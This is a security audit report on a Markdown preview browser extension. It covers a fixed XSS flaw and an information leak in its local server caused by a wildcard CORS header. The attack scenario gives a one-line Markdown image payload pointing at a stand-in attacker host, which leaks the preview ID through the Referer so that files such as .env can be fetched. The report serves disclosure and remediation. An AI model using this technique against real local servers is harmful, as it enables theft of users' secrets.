# Security Inspection Report: Markdown Preview in Browser

**Date:** April 28, 2026
**Extension Name:** Markdown Preview in Browser (`markdown-preview-ext`)
**Status:** ✅ FIXED (Critical vulnerabilities addressed in version 0.1.0-prt-001)

## 1. Executive Summary
The extension provides a local HTTP server to preview Markdown files in an external browser. A security audit identified critical flaws allowing XSS and information leakage. These have been addressed by implementing HTML sanitization and a strict referrer policy.

---

## 2. Resolved Vulnerabilities

### 2.1. Cross-Site Scripting (XSS) in Preview [FIXED]
**File:** `src/markdownRenderer.ts`
**Resolution:** Integrated `DOMPurify` (with `jsdom`) to sanitize all rendered Markdown content. This removes executable scripts and malicious event handlers while preserving safe HTML formatting.

### 2.2. Information Leakage & CORS Misconfiguration
**File:** `src/server.ts`
**Description:** The local server sets `Access-Control-Allow-Origin: *` for all responses and does not protect the `previewId`.
```typescript
res.setHeader('Access-Control-Allow-Origin', '*');
```
**Attack Scenario:**
1. A user previews a malicious Markdown file containing an image or link to an attacker-controlled domain: `![leak](http://attacker.com/log)`.
2. The browser sends a request to `attacker.com`. The `Referer` header will contain the full URL: `http://localhost:3000/preview/[previewId]`.
3. The attacker now knows the `previewId`.
4. Since `Access-Control-Allow-Origin` is set to `*`, the attacker's website can now use `fetch()` to read the content of the Markdown file or any file in the same directory via the `/asset/` endpoint (e.g., `.env` files, source code, etc.).
**Impact:** Potential theft of sensitive data located in the same directory as the previewed Markdown file.

---

## 3. Residual Moderate Vulnerabilities

### 3.1. CORS Misconfiguration
**File:** `src/server.ts`
**Description:** The local server still sets `Access-Control-Allow-Origin: *`.
**Recommendation:** Restrict this to `127.0.0.1` or remove it if external script access to the local server is not required.

### 3.2. Brittle HTML Manipulation via Regex
**File:** `src/server.ts` / `src/markdownRenderer.ts`
**Description:** The extension continues to use regular expressions to rewrite HTML for asset paths and link targets.
**Recommendation:** Migrate to a proper DOM-based manipulation after rendering if further modifications are needed.
